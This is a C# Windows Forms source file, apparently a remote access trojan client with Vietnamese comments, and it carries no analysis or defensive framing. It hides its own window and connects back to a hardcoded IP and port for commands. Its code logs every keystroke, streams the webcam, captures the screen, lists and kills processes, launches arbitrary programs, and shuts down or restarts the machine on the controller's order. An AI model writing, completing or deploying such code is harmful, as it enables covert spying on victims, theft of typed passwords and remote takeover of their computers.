using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;

namespace TargetApp
{
    public partial class Form1 : Form
    {
        // --- CẤU HÌNH ---
        const string HOST_IP = "26.201.85.236";
        const int HOST_PORT = 9999;

        TcpClient client;
        NetworkStream stream;
        private readonly object _lockObj = new object();

        VideoCaptureDevice videoSource;
        bool isCamOn = false;
        bool isSendingImage = false;

        // Keylog
        [DllImport("User32.dll")] public static extern short GetAsyncKeyState(int vKey);
        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
        StringBuilder keyLogBuffer = new StringBuilder();

        // UI Debug (Giữ biến nhưng không hiện)
        RichTextBox txtLog = new RichTextBox();

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

            // --- CHẾ ĐỘ TÀNG HÌNH ---
            this.ShowInTaskbar = false;
            this.Opacity = 0;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Size = new Size(1, 1);
            this.Text = "";

            this.Load += Form1_Load;
            this.FormClosing += Form1_FormClosing;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Thread t = new Thread(ConnectLoop);
            t.IsBackground = true;
            t.Start();

            keylogTimer.Interval = 10;
            keylogTimer.Tick += KeylogTimer_Tick;
            keylogTimer.Start();
        }

        // Hàm Log trống (vì ẩn giao diện)
        void Log(string msg) { }

        void SendPacket(string msg)
        {
            if (client == null || !client.Connected) return;
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(msg);
                byte[] len = BitConverter.GetBytes(data.Length);

                lock (_lockObj)
                {
                    stream.Write(len, 0, 4);
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch { }
        }

        void ConnectLoop()
        {
            while (true)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(HOST_IP, HOST_PORT);
                    stream = client.GetStream();

                    SendPacket("Target V8 Online (Fix Restart)");

                    byte[] buffer = new byte[4096];
                    while (client.Connected)
                    {
                        if (stream.DataAvailable)
                        {
                            int len = stream.Read(buffer, 0, buffer.Length);
                            if (len > 0)
                            {
                                string cmd = Encoding.UTF8.GetString(buffer, 0, len);
                                ProcessCommand(cmd);
                            }
                        }
                        Thread.Sleep(10);
                    }
                }
                catch { Thread.Sleep(2000); }
            }
        }

        // --- XỬ LÝ LỆNH ---
        void ProcessCommand(string cmd)
        {
            try
            {
                string[] parts = cmd.Split('|');
                string action = parts[0];
                string param = parts.Length > 1 ? parts[1] : "";

                if (action == "WEBCAM_ON")
                {
                    StartWebcam();
                }
                else if (action == "WEBCAM_OFF")
                {
                    StopWebcam();
                }
                else if (action == "SCREENSHOT")
                {
                    string s = CaptureScreen();
                    if (!string.IsNullOrEmpty(s)) SendPacket("IMG|" + s);
                }
                else if (action == "LIST")
                {
                    SendPacket("PID:\n" + GetProcs());
                }
                else if (action == "KEYLOG")
                {
                    string logs = keyLogBuffer.ToString();
                    keyLogBuffer.Clear();
                    SendPacket("KEYLOG:\n" + (string.IsNullOrEmpty(logs) ? "(Trống)" : logs));
                }
                else if (action == "START")
                {
                    try
                    {
                        Process.Start(param);
                        SendPacket($"OK: Đã mở '{param}'");
                    }
                    catch
                    {
                        SendPacket($"LỖI: Không mở được '{param}'");
                    }
                }
                else if (action == "STOP")
                {
                    StopProcess(param);
                }
                else if (action == "SHUTDOWN")
                {
                    Process.Start("shutdown", "/s /t 0");
                }
                // --- ĐÃ SỬA LẠI LỆNH RESTART ---
                else if (action == "RESTART")
                {
                    SendPacket("Đang khởi động lại máy...");
                    Process.Start("shutdown", "/r /t 0");
                }
            }
            catch { }
        }

        // --- HÀM TẮT APP ---
        void StopProcess(string param)
        {
            try
            {
                string targetName = param.ToLower().Trim().Replace(".exe", "");
                int count = 0;

                if (int.TryParse(targetName, out int pid))
                {
                    try { Process.GetProcessById(pid).Kill(); count++; } catch { }
                }
                else
                {
                    Process[] procs = Process.GetProcessesByName(targetName);
                    if (procs.Length == 0)
                    {
                        foreach (var p in Process.GetProcesses())
                        {
                            if (p.ProcessName.ToLower().Contains(targetName))
                            {
                                try { p.Kill(); count++; } catch { }
                            }
                        }
                    }
                    else
                    {
                        foreach (var p in procs) { try { p.Kill(); count++; } catch { } }
                    }
                }

                if (count > 0) SendPacket($"OK: Đã diệt {count} tiến trình '{targetName}'");
                else SendPacket($"LỖI: Không tắt được '{targetName}' (Cần quyền Admin?)");
            }
            catch (Exception ex) { SendPacket($"LỖI HỆ THỐNG: {ex.Message}"); }
        }

        // --- CAMERA ---
        void StartWebcam()
        {
            try
            {
                if (isCamOn) return;
                var devs = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devs.Count == 0) { SendPacket("Lỗi: Không có Webcam"); return; }

                videoSource = new VideoCaptureDevice(devs[0].MonikerString);

                // Lấy độ phân giải tốt nhất
                VideoCapabilities bestRes = null;
                foreach (VideoCapabilities cap in videoSource.VideoCapabilities)
                {
                    if (cap.FrameSize.Width == 640 && cap.FrameSize.Height == 480) { bestRes = cap; break; }
                }
                if (bestRes == null && videoSource.VideoCapabilities.Length > 0)
                    bestRes = videoSource.VideoCapabilities[videoSource.VideoCapabilities.Length - 1];

                if (bestRes != null) videoSource.VideoResolution = bestRes;

                videoSource.NewFrame += VideoSource_NewFrame;
                videoSource.Start();
                isCamOn = true;
            }
            catch { }
        }

        void StopWebcam()
        {
            isCamOn = false;
            if (videoSource != null)
            {
                if (videoSource.IsRunning) { videoSource.SignalToStop(); videoSource.WaitForStop(); }
                videoSource = null;
            }
        }

        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (!isCamOn || isSendingImage) return;
            isSendingImage = true;

            try
            {
                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
                {
                    int w = original.Width > 800 ? 800 : original.Width;
                    int h = original.Height > 600 ? 600 : original.Height;

                    using (Bitmap resized = new Bitmap(original, new Size(w, h)))
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            EncoderParameters eps = new EncoderParameters(1);
                            eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 70L);
                            resized.Save(ms, GetEncoder(ImageFormat.Jpeg), eps);
                            string base64 = Convert.ToBase64String(ms.ToArray());
                            SendPacket("IMG|" + base64);
                        }
                    }
                }
            }
            catch { }
            finally { isSendingImage = false; }
        }

        // --- KEYLOG ---
        private bool[] _prevKeys = new bool[256];
        private void KeylogTimer_Tick(object sender, EventArgs e)
        {
            for (int i = 0; i < 255; i++)
            {
                short state = GetAsyncKeyState(i);
                bool isPressed = (state & 0x8000) != 0;
                if (isPressed && !_prevKeys[i])
                {
                    Keys key = (Keys)i;
                    string text = key.ToString();
                    if (key >= Keys.A && key <= Keys.Z) text = text;
                    else if (key >= Keys.D0 && key <= Keys.D9) text = key.ToString().Replace("D", "");
                    else if (key == Keys.Space) text = " ";
                    else if (key == Keys.Enter) text = "\n[ENTER]";
                    else if (key == Keys.Back) text = "[BS]";
                    else text = $"[{key}]";
                    keyLogBuffer.Append(text);
                }
                _prevKeys[i] = isPressed;
            }
        }

        string GetProcs()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process p in Process.GetProcesses()) sb.AppendLine($"[{p.Id}] {p.ProcessName}");
            return sb.ToString();
        }
        string CaptureScreen()
        {
            try
            {
                Rectangle b = Screen.GetBounds(Point.Empty);
                using (Bitmap bmp = new Bitmap(b.Width, b.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        EncoderParameters eps = new EncoderParameters(1);
                        eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
                        bmp.Save(ms, GetEncoder(ImageFormat.Jpeg), eps);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch { return ""; }
        }
        private ImageCodecInfo GetEncoder(ImageFormat f)
        {
            foreach (var c in ImageCodecInfo.GetImageDecoders()) if (c.FormatID == f.Guid) return c; return null;
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e) { StopWebcam(); }
    }
}